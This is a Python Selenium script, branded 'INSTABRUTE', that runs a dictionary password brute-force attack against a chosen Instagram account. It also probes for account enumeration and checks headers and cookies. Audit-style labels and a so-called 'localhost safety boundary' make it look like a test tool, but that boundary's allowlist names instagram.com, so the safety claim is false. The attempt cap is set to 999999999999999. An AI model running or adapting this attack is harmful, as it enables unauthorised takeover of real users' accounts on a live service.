from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException

from urllib.parse import urlparse
from datetime import datetime

import requests
import statistics
import hashlib
import json
import csv
import time
import os

# ============================================================
# TERMINAL COLORS
# ============================================================

normal_color = "\033[0m"

info_color = "\033[1;33m"       # Bold yellow
red_color = "\033[1;31m"        # Bold red
green_color = "\033[1;32m"      # Bold green
whiteB_color = "\033[1;37m"     # Bold white
detect_color = "\033[1;34m"     # Bold blue

banner_color = "\033[1;33;40m"
end_banner_color = "\033[0m"

# ============================================================
# LOGO
# ============================================================

def Logo():
    print(r'''
                               ....
                                    %
                                     ^
                            L
                            "F3  $r
                           $$$$.e$"  .
                           "$$$$$"   "
     (unknowncris by 8.4v)  $$$$c  /
        .                   $$$$$$$P
       ."c                      $$$
      .$c3b                  ..J$$$$$e
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
==============================================
[developer] => Cristian 
[developer_instagram] => _.cristian65o._2
==============================================
''')
    
# ============================================================
# SHOW LOGO
# ============================================================

print(detect_color, end="")
Logo()

# ============================================================
# AUTHLAB CONFIGURATION
# ============================================================

TEST_URL = "https://www.instagram.com"

LOGIN_PATH = "/"

FORM_WAIT = 10
RESULT_WAIT = 5
HTTP_TIMEOUT = 5

# Hard global ceiling.
MAX_BROWSER_ATTEMPTS = 999999999999999

# Small number of malformed-input tests.
MAX_ROBUSTNESS_TESTS = 8

LATENCY_SAMPLE_SIZE = 5

FAILURE_TEXT = (
    "The login information you entered is incorrect."
)

REPORT_DIR = os.path.expanduser(
    "~/Documents/AuthLab"
)

CSV_REPORT = os.path.join(
    REPORT_DIR,
    "authlab_evidence.csv"
)

JSON_REPORT = os.path.join(
    REPORT_DIR,
    "authlab_findings.json"
)


# ============================================================
# LOCALHOST SAFETY BOUNDARY
# ============================================================

parsed_target = urlparse(TEST_URL)

ALLOWED_HOSTS = {
    "www.instagram.com",
    "www.instagram.com",
    "::1"
}

if parsed_target.hostname not in ALLOWED_HOSTS:
    raise SystemExit(
        "\n[-] AUTHLAB aggressive mode is restricted "
        "to localhost.\n"
    )


# ============================================================
# CREATE REPORT DIRECTORY
# ============================================================

os.makedirs(
    REPORT_DIR,
    exist_ok=True
)


# ============================================================
# INPUT
# ============================================================

print()
print("=" * 70)
print("                         INSTABRUTE")
print("             INSTAGRAM DICTIONARY BRUTE ATTACK")
print("=" * 70)
print()
print(f"Target: {TEST_URL}")
print()

username = input(
    "Username or Email: "
)

nonexistent_username = input(
    "Nonexistent test username "
    "(or press ENTER to generate one): "
)

if not nonexistent_username:

    nonexistent_username = (
        "authlab_nonexistent_"
        + str(int(time.time()))
    )

dictionary = input(
    "Dictionary filename: "
)

dictionary_path = os.path.expanduser(
    f"~/Documents/{dictionary}.txt"
)


# ============================================================
# LOAD CANDIDATES
# ============================================================

try:

    with open(
        dictionary_path,
        "r",
        encoding="utf-8"
    ) as file:

        candidates = [
            line.strip()
            for line in file
            if line.strip()
        ]

except FileNotFoundError:

    raise SystemExit(
        f"\n[-] Dictionary not found:\n"
        f"{dictionary_path}\n"
    )


if not candidates:

    raise SystemExit(
        "[-] Dictionary contains no candidates."
    )


test_candidates = candidates[
    :MAX_BROWSER_ATTEMPTS
]


# ============================================================
# STORAGE
# ============================================================

findings = []
evidence = []

browser_response_times = []
rejected_response_times = []

browser_attempts = 0

test_start = time.perf_counter()


# ============================================================
# FINDING ENGINE
# ============================================================

def add_finding(
    module,
    title,
    status,
    severity,
    evidence_text,
    remediation
):

    finding = {
        "module": module,
        "title": title,
        "status": status,
        "severity": severity,
        "evidence": evidence_text,
        "remediation": remediation
    }

    findings.append(
        finding
    )


def add_evidence(
    module,
    test,
    result,
    elapsed="",
    details=""
):

    evidence.append({
        "module": module,
        "test": test,
        "result": result,
        "elapsed": elapsed,
        "details": details
    })


# ============================================================
# MASK SECRETS
# ============================================================

def mask_value(value):

    if not value:
        return ""

    if len(value) <= 2:
        return "*" * len(value)

    return (
        value[0]
        + "*" * (len(value) - 2)
        + value[-1]
    )


# ============================================================
# HASH RESPONSE BODY
# ============================================================

def body_fingerprint(text):

    normalized = (
        text.strip()
        .replace("\r", "")
    )

    return hashlib.sha256(
        normalized.encode(
            "utf-8",
            errors="ignore"
        )
    ).hexdigest()[:16]


# ============================================================
# SERVER HEALTH
# ============================================================

def server_health():

    try:

        start = time.perf_counter()

        response = requests.get(
            TEST_URL,
            timeout=HTTP_TIMEOUT,
            allow_redirects=False
        )

        elapsed = (
            time.perf_counter()
            - start
        )

        return {
            "alive": True,
            "status": response.status_code,
            "time": elapsed
        }

    except requests.RequestException:

        return {
            "alive": False,
            "status": None,
            "time": None
        }


# ============================================================
# HTTP BASELINE
# ============================================================

print()
print("[01] SERVER BASELINE")
print("-" * 70)

health = server_health()

if not health["alive"]:

    raise SystemExit(
        "[-] Local server is unavailable."
    )

print(
    f"[+] HTTP status: "
    f"{health['status']}"
)

print(
    f"[+] Response: "
    f"{health['time']:.3f}s"
)

add_evidence(
    "Baseline",
    "Server availability",
    health["status"],
    f"{health['time']:.3f}",
    "Local server reachable"
)


# ============================================================
# SECURITY HEADERS
# ============================================================

print()
print("[02] HTTP SECURITY HEADERS")
print("-" * 70)

try:

    response = requests.get(
        TEST_URL,
        timeout=HTTP_TIMEOUT
    )

    headers = response.headers

except requests.RequestException:

    headers = {}


security_headers = {
    "Content-Security-Policy":
        "Helps restrict executable content",

    "X-Content-Type-Options":
        "Reduces MIME-sniffing risk",

    "Referrer-Policy":
        "Controls referrer information",

    "X-Frame-Options":
        "Legacy clickjacking protection",

    "Permissions-Policy":
        "Restricts browser capabilities"
}


for header, purpose in security_headers.items():

    value = headers.get(
        header
    )

    if value:

        print(
            f"[PASS] {header}: {value}"
        )

        add_finding(
            "HTTP Headers",
            header,
            "PASS",
            "INFO",
            f"Present: {value}",
            "No immediate action required."
        )

    else:

        print(
            f"[WARN] {header}: missing"
        )

        add_finding(
            "HTTP Headers",
            header,
            "WARN",
            "LOW",
            "Header was not observed.",
            purpose
        )


# ============================================================
# HSTS
# ============================================================

if parsed_target.scheme == "https":

    if "Strict-Transport-Security" in headers:

        add_finding(
            "HTTP Headers",
            "HSTS",
            "PASS",
            "INFO",
            "Strict-Transport-Security observed.",
            "No immediate action required."
        )

    else:

        add_finding(
            "HTTP Headers",
            "HSTS",
            "WARN",
            "MEDIUM",
            "HTTPS endpoint did not return HSTS.",
            "Consider enabling HSTS in production."
        )

else:

    add_finding(
        "HTTP Headers",
        "HSTS",
        "DEV-HTTP",
        "INFO",
        "Application is running over localhost HTTP.",
        "Evaluate HSTS on the production HTTPS deployment."
    )


# ============================================================
# CACHE CONTROL
# ============================================================

cache_control = headers.get(
    "Cache-Control",
    ""
)

print()

if cache_control:

    print(
        f"[*] Cache-Control: {cache_control}"
    )

else:

    print(
        "[WARN] Cache-Control not observed"
    )



# ============================================================
# BASIC INFORMATION DISCLOSURE
# ============================================================

print()
print("[03] INFORMATION DISCLOSURE")
print("-" * 70)

disclosure_headers = [
    "Server",
    "X-Powered-By"
]

for header in disclosure_headers:

    value = headers.get(
        header
    )

    if value:

        print(
            f"[WARN] {header}: {value}"
        )

        add_finding(
            "Information Disclosure",
            header,
            "WARN",
            "LOW",
            f"{header} exposed: {value}",
            "Remove unnecessary technology/version disclosure."
        )

    else:

        print(
            f"[PASS] {header} not exposed"
        )


# ============================================================
# COOKIE AUDIT - HTTP
# ============================================================

print()
print("[04] INITIAL COOKIE AUDIT")
print("-" * 70)

http_session = requests.Session()

try:

    cookie_response = http_session.get(
        TEST_URL,
        timeout=HTTP_TIMEOUT
    )

    cookies = list(
        http_session.cookies
    )

except requests.RequestException:

    cookies = []


if not cookies:

    print(
        "[*] No initial HTTP cookies observed."
    )

else:

    for cookie in cookies:

        print(
            f"[*] Cookie: {cookie.name}"
        )

        # Never print cookie values.


# ============================================================
# BROWSER HELPERS
# ============================================================

def create_browser():

    driver = webdriver.Chrome()

    wait = WebDriverWait(
        driver,
        FORM_WAIT
    )

    driver.get(
        TEST_URL
    )

    wait.until(
        EC.presence_of_element_located(
            (By.NAME, "email")
        )
    )

    return driver, wait


def replace_text(
    element,
    text
):

    element.send_keys(
        Keys.COMMAND,
        "a"
    )

    element.send_keys(
        Keys.BACKSPACE
    )

    element.send_keys(
        text
    )


def get_cookie_map(driver):

    return {
        cookie["name"]:
        cookie["value"]

        for cookie
        in driver.get_cookies()
    }


def cookie_changes(
    before,
    after
):

    changes = []

    for name, value in after.items():

        if name not in before:

            changes.append(
                name
            )

        elif before[name] != value:

            changes.append(
                name
            )

    return changes


def failure_visible(driver):

    return bool(
        driver.find_elements(
            By.XPATH,
            "//*[contains(text(), "
            "'The login information you entered is incorrect.')]"
        )
    )


# ============================================================
# WAIT FOR RESULT
# ============================================================

def wait_for_login_result(
    driver,
    before_cookies
):

    deadline = (
        time.perf_counter()
        + RESULT_WAIT
    )

    while time.perf_counter() < deadline:

        if failure_visible(
            driver
        ):

            return (
                "REJECTED",
                []
            )

        after = get_cookie_map(
            driver
        )

        changed = cookie_changes(
            before_cookies,
            after
        )

        if changed:

            return (
                "COOKIE_STATE_CHANGED",
                changed
            )

        time.sleep(
            0.05
        )

    return (
        "UNKNOWN",
        []
    )


# ============================================================
# LOGIN ATTEMPT
# ============================================================

def browser_login(
    driver,
    wait,
    login_username,
    password
):

    global browser_attempts

    if browser_attempts >= MAX_BROWSER_ATTEMPTS:

        return {
            "result": "GLOBAL_LIMIT_REACHED",
            "elapsed": 0,
            "cookies": []
        }


    browser_attempts += 1


    try:

        email_box = wait.until(
            EC.presence_of_element_located(
                (By.NAME, "email")
            )
        )

        password_box = wait.until(
            EC.presence_of_element_located(
                (By.NAME, "pass")
            )
        )

        login_button = wait.until(
            EC.element_to_be_clickable(
                (
                    By.CSS_SELECTOR,
                    '[aria-label="Log In"]'
                    '[role="button"]'
                )
            )
        )

    except TimeoutException:

        return {
            "result": "FORM_UNAVAILABLE",
            "elapsed": 0,
            "cookies": []
        }


    replace_text(
        email_box,
        login_username
    )

    replace_text(
        password_box,
        password
    )

    before = get_cookie_map(
        driver
    )

    start = time.perf_counter()

    login_button.click()

    result, changed = (
        wait_for_login_result(
            driver,
            before
        )
    )

    elapsed = (
        time.perf_counter()
        - start
    )

    return {
        "result": result,
        "elapsed": elapsed,
        "cookies": changed
    }


# ============================================================
# START BROWSER
# ============================================================

print()
print("[05] BROWSER AUTHENTICATION TEST")
print("-" * 70)

driver, wait = create_browser()


# ============================================================
# BOUNDED CREDENTIAL RESISTANCE
# ============================================================

for number, password in enumerate(
    test_candidates,
    start=1
):

    print(
        f"[*] Attempt "
        f"{number}/{len(test_candidates)}"
    )

    result = browser_login(
        driver,
        wait,
        username,
        password
    )

    elapsed = result[
        "elapsed"
    ]

    if elapsed:

        browser_response_times.append(
            elapsed
        )


    if result["result"] == "REJECTED":

        rejected_response_times.append(
            elapsed
        )


    print(
        f"    {result['result']} "
        f"({elapsed:.3f}s)"
    )


    add_evidence(
        "Authentication",
        f"Candidate {number}",
        result["result"],
        f"{elapsed:.3f}",
        (
            "Candidate="
            + mask_value(password)
        )
    )


    # Stop if application becomes unavailable.
    health = server_health()

    if not health["alive"]:

        print()
        print(
            "[!] Server became unavailable."
        )

        print(
            "[!] Stopping authentication module."
        )

        add_finding(
            "Stability",
            "Server availability",
            "FAIL",
            "HIGH",
            "Server stopped responding during bounded testing.",
            "Investigate authentication-path resource handling."
        )

        break


# ============================================================
# TIMING STATISTICS
# ============================================================

print()
print("[06] AUTHENTICATION TIMING")
print("-" * 70)


if rejected_response_times:

    mean_latency = statistics.mean(
        rejected_response_times
    )

    median_latency = statistics.median(
        rejected_response_times
    )

    fastest = min(
        rejected_response_times
    )

    slowest = max(
        rejected_response_times
    )

    if len(
        rejected_response_times
    ) > 1:

        deviation = statistics.stdev(
            rejected_response_times
        )

    else:

        deviation = 0


    ordered = sorted(
        rejected_response_times
    )

    p95_index = min(
        len(ordered) - 1,
        int(
            0.95
            * len(ordered)
        )
    )

    p95 = ordered[
        p95_index
    ]


    print(
        f"Mean:       {mean_latency:.3f}s"
    )

    print(
        f"Median:     {median_latency:.3f}s"
    )

    print(
        f"Std dev:    {deviation:.3f}s"
    )

    print(
        f"Fastest:    {fastest:.3f}s"
    )

    print(
        f"Slowest:    {slowest:.3f}s"
    )

    print(
        f"Approx p95: {p95:.3f}s"
    )

else:

    mean_latency = 0
    median_latency = 0
    deviation = 0
    fastest = 0
    slowest = 0
    p95 = 0


# ============================================================
# EARLY VS LATE
# ============================================================

sample_size = min(
    LATENCY_SAMPLE_SIZE,
    len(rejected_response_times) // 2
)


if sample_size >= 2:

    early = rejected_response_times[
        :sample_size
    ]

    late = rejected_response_times[
        -sample_size:
    ]

    early_mean = statistics.mean(
        early
    )

    late_mean = statistics.mean(
        late
    )

    if early_mean > 0:

        latency_change = (
            (
                late_mean
                - early_mean
            )
            / early_mean
        ) * 100

    else:

        latency_change = 0


    print(
        f"Early avg:  {early_mean:.3f}s"
    )

    print(
        f"Late avg:   {late_mean:.3f}s"
    )

    print(
        f"Change:     {latency_change:+.1f}%"
    )


    if latency_change >= 50:

        add_finding(
            "Authentication",
            "Repeated-attempt latency",
            "OBSERVED",
            "INFO",
            (
                f"Late rejection responses were "
                f"{latency_change:+.1f}% different "
                f"from early responses."
            ),
            (
                "Timing changes may indicate throttling "
                "or application degradation; correlate "
                "with server-side logs."
            )
        )

else:

    early_mean = 0
    late_mean = 0
    latency_change = 0


# ============================================================
# COOKIE ATTRIBUTE AUDIT
# ============================================================

print()
print("[07] BROWSER COOKIE SECURITY")
print("-" * 70)

browser_cookies = driver.get_cookies()


if not browser_cookies:

    print(
        "[*] No browser cookies observed."
    )


for cookie in browser_cookies:

    name = cookie.get(
        "name",
        "UNKNOWN"
    )

    http_only = cookie.get(
        "httpOnly",
        False
    )

    secure = cookie.get(
        "secure",
        False
    )

    same_site = cookie.get(
        "sameSite",
        None
    )

    print()
    print(
        f"Cookie:   {name}"
    )

    print(
        f"HttpOnly: {http_only}"
    )

    print(
        f"Secure:   {secure}"
    )

    print(
        f"SameSite: {same_site}"
    )


    if http_only:

        http_status = "PASS"

    else:

        http_status = "WARN"


    add_finding(
        "Session",
        f"{name} HttpOnly",
        http_status,
        (
            "INFO"
            if http_only
            else "MEDIUM"
        ),
        f"HttpOnly={http_only}",
        (
            "Authentication cookies should normally "
            "use HttpOnly."
        )
    )


    if parsed_target.scheme == "http":

        secure_status = (
            "DEV-HTTP"
        )

    else:

        secure_status = (
            "PASS"
            if secure
            else "WARN"
        )


    add_finding(
        "Session",
        f"{name} Secure",
        secure_status,
        (
            "INFO"
            if secure_status != "WARN"
            else "MEDIUM"
        ),
        f"Secure={secure}",
        (
            "Production authentication cookies "
            "should normally use Secure over HTTPS."
        )
    )


# ============================================================
# ACCOUNT ENUMERATION OBSERVATION
# ============================================================

print()
print("[08] ACCOUNT ENUMERATION OBSERVATION")
print("-" * 70)

# We use exactly one intentionally incorrect password
# for each account identity.

enum_password = (
    "AUTHLAB_ENUMERATION_TEST_"
    + str(int(time.time()))
)


if browser_attempts + 2 <= MAX_BROWSER_ATTEMPTS:

    # Reload to reduce stale DOM state.
    driver.get(
        TEST_URL
    )

    existing_test = browser_login(
        driver,
        wait,
        username,
        enum_password
    )


    driver.get(
        TEST_URL
    )

    missing_test = browser_login(
        driver,
        wait,
        nonexistent_username,
        enum_password
    )


    existing_time = existing_test[
        "elapsed"
    ]

    missing_time = missing_test[
        "elapsed"
    ]


    print(
        f"Existing account:    "
        f"{existing_test['result']} "
        f"{existing_time:.3f}s"
    )

    print(
        f"Nonexistent account: "
        f"{missing_test['result']} "
        f"{missing_time:.3f}s"
    )


    result_difference = (
        existing_test["result"]
        != missing_test["result"]
    )


    if result_difference:

        add_finding(
            "Enumeration",
            "Authentication response consistency",
            "WARN",
            "MEDIUM",
            (
                "Existing and nonexistent accounts "
                "produced different observable states."
            ),
            (
                "Return equivalent authentication "
                "failure behavior for unknown users "
                "and incorrect passwords."
            )
        )

    else:

        add_finding(
            "Enumeration",
            "Authentication response consistency",
            "PASS",
            "INFO",
            (
                "Existing and nonexistent accounts "
                "produced the same classified state."
            ),
            "Continue using generic authentication errors."
        )


# ============================================================
# CONTROLLED INPUT ROBUSTNESS
# ============================================================

print()
print("[09] INPUT ROBUSTNESS")
print("-" * 70)

robustness_inputs = [
    "",
    " ",
    "A" * 256,
    "☃️Unicode-Test",
    "<test>",
    "\"test\"",
    "'test'",
    "user@example.invalid"
]

robustness_inputs = robustness_inputs[
    :MAX_ROBUSTNESS_TESTS
]


for number, test_value in enumerate(
    robustness_inputs,
    start=1
):

    health_before = server_health()

    if not health_before[
        "alive"
    ]:

        break


    try:

        start = time.perf_counter()

        response = requests.get(
            TEST_URL,
            params={
                "authlab_probe":
                    test_value
            },
            timeout=HTTP_TIMEOUT,
            allow_redirects=False
        )

        elapsed = (
            time.perf_counter()
            - start
        )

        print(
            f"[*] Input {number}: "
            f"HTTP {response.status_code} "
            f"{elapsed:.3f}s"
        )


        if response.status_code >= 500:

            add_finding(
                "Input Robustness",
                f"Probe {number}",
                "WARN",
                "MEDIUM",
                (
                    f"Controlled malformed input "
                    f"produced HTTP "
                    f"{response.status_code}."
                ),
                (
                    "Review server-side input validation "
                    "and exception handling."
                )
            )


        add_evidence(
            "Input Robustness",
            f"Probe {number}",
            response.status_code,
            f"{elapsed:.3f}",
            (
                "Body fingerprint="
                + body_fingerprint(
                    response.text
                )
            )
        )

    except requests.RequestException:

        add_finding(
            "Input Robustness",
            f"Probe {number}",
            "WARN",
            "HIGH",
            "Server request failed during robustness test.",
            (
                "Review whether malformed input can "
                "destabilize the application."
            )
        )

        break


# ============================================================
# FRESH BROWSER TEST
# ============================================================

print()
print("[10] FRESH BROWSER STATE")
print("-" * 70)

old_cookie_names = {
    cookie["name"]
    for cookie in driver.get_cookies()
}

driver.quit()

time.sleep(
    1
)


try:

    fresh_driver, fresh_wait = (
        create_browser()
    )

    fresh_cookie_names = {
        cookie["name"]
        for cookie
        in fresh_driver.get_cookies()
    }

    print(
        "[+] Fresh Chrome session created."
    )

    print(
        f"Old cookie names:   "
        f"{len(old_cookie_names)}"
    )

    print(
        f"Fresh cookie names: "
        f"{len(fresh_cookie_names)}"
    )

    fresh_status = (
        "COMPLETED"
    )

except Exception as error:

    fresh_driver = None

    fresh_status = (
        "FAILED"
    )

    print(
        f"[?] Fresh browser failed: "
        f"{type(error).__name__}"
    )


# ============================================================
# FINAL SERVER HEALTH
# ============================================================

print()
print("[11] FINAL SERVER HEALTH")
print("-" * 70)

final_health = server_health()


if final_health["alive"]:

    print(
        f"[PASS] Server responding "
        f"HTTP {final_health['status']}"
    )

    add_finding(
        "Stability",
        "Post-assessment availability",
        "PASS",
        "INFO",
        (
            "Server remained reachable after "
            "the bounded assessment."
        ),
        "No immediate action required."
    )

else:

    print(
        "[FAIL] Server stopped responding."
    )

    add_finding(
        "Stability",
        "Post-assessment availability",
        "FAIL",
        "HIGH",
        (
            "Server was unavailable after "
            "the bounded assessment."
        ),
        (
            "Review resource exhaustion, exception "
            "handling and authentication processing."
        )
    )


# ============================================================
# WRITE CSV EVIDENCE
# ============================================================

with open(
    CSV_REPORT,
    "w",
    newline="",
    encoding="utf-8"
) as file:

    writer = csv.writer(
        file
    )

    writer.writerow([
        "Module",
        "Test",
        "Result",
        "Elapsed Seconds",
        "Details"
    ])

    for item in evidence:

        writer.writerow([
            item["module"],
            item["test"],
            item["result"],
            item["elapsed"],
            item["details"]
        ])


# ============================================================
# WRITE JSON FINDINGS
# ============================================================

report = {
    "tool": "AuthLab",
    "generated": datetime.now().isoformat(),
    "target": TEST_URL,

    "limits": {
        "browser_attempt_ceiling":
            MAX_BROWSER_ATTEMPTS,

        "robustness_test_ceiling":
            MAX_ROBUSTNESS_TESTS
    },

    "statistics": {
        "browser_attempts":
            browser_attempts,

        "mean_rejection_latency":
            mean_latency,

        "median_rejection_latency":
            median_latency,

        "standard_deviation":
            deviation,

        "p95_rejection_latency":
            p95,

        "early_average":
            early_mean,

        "late_average":
            late_mean,

        "latency_change_percent":
            latency_change,

        "fresh_browser_test":
            fresh_status
    },

    "findings":
        findings
}


with open(
    JSON_REPORT,
    "w",
    encoding="utf-8"
) as file:

    json.dump(
        report,
        file,
        indent=4
    )


# ============================================================
# SCORE FINDINGS
# ============================================================

passes = sum(
    1
    for finding in findings
    if finding["status"] == "PASS"
)

warnings = sum(
    1
    for finding in findings
    if finding["status"] == "WARN"
)

failures = sum(
    1
    for finding in findings
    if finding["status"] == "FAIL"
)

observations = (
    len(findings)
    - passes
    - warnings
    - failures
)


total_runtime = (
    time.perf_counter()
    - test_start
)


# ============================================================
# FINAL DASHBOARD
# ============================================================

print()
print()
print("=" * 70)
print("                 AUTHLAB SECURITY ASSESSMENT")
print("=" * 70)

print(
    f"Target:                {TEST_URL}"
)

print(
    f"Browser attempts:      "
    f"{browser_attempts}/"
    f"{MAX_BROWSER_ATTEMPTS}"
)

print(
    f"Total runtime:         "
    f"{total_runtime:.2f}s"
)

print("-" * 70)

print(
    f"PASS:                  {passes}"
)

print(
    f"WARN:                  {warnings}"
)

print(
    f"FAIL:                  {failures}"
)

print(
    f"Other observations:    {observations}"
)

print("-" * 70)

print(
    f"Median rejection:      "
    f"{median_latency:.3f}s"
)

print(
    f"Approx p95:            "
    f"{p95:.3f}s"
)

print(
    f"Latency change:        "
    f"{latency_change:+.1f}%"
)

print(
    f"Fresh browser:         "
    f"{fresh_status}"
)

print("-" * 70)

print("[+] Evidence:")
print(CSV_REPORT)

print()

print("[+] Findings:")
print(JSON_REPORT)

print("=" * 70)


# ============================================================
# IMPORTANT INTERPRETATION
# ============================================================

print()
print(
    "[*] A cookie change is recorded only as a state "
    "change, not proof of authentication."
)

print(
    "[*] Timing differences are observations, not proof "
    "of throttling or account enumeration."
)

print(
    "[*] Cookie values and complete password candidates "
    "are not written to reports."
)


# ============================================================
# CLEANUP
# ============================================================

input(
    "\nPress ENTER to close..."
)

if fresh_driver is not None:

    fresh_driver.quit()
